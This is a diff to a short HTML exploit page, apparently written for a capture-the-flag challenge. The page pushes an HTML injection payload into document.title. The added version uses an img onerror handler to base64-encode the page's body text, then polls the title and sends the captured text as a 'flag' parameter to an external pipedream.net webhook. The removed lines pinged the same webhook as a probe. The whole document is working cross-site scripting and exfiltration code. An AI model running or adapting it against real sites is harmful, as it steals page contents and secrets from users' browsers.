@@ -2,22 +2,21 @@
 <html>
 <body>
     <script>
-        (new Image()).src = "https://eou0c9qohvcityk.m.pipedream.net?stage=1";
+        const webhook = "https://eou0c9qohvcityk.m.pipedream.net";
 
-        let count = 0;
-        const benignTitles = ["A", "B", "C", "D", "E", "F"];
-        
-        const payload = `</h1><img src="https://eou0c9qohvcityk.m.pipedream.net?stage=2"><h1>`;
+        const payload = `</h1><img src="x" onerror="document.title = 'DATA:' + btoa(document.body.innerText)"><h1>`;
 
-        const interval = setInterval(() => {
-            if (count < benignTitles.length) {
-                document.title = benignTitles[count];
-            } else {
-                document.title = payload;
-                clearInterval(interval);
+        setTimeout(() => {
+            document.title = payload;
+        }, 500);
+
+        const catchInterval = setInterval(() => {
+            if (document.title.includes("DATA:")) {
+                const sec = document.title.split("DATA:")[1];
+                (new Image()).src = webhook + "?flag=" + sec;
+                clearInterval(catchInterval);
             }
-            count++;
-        }, 1000);
+        }, 500);
     </script>
 </body>
 </html>
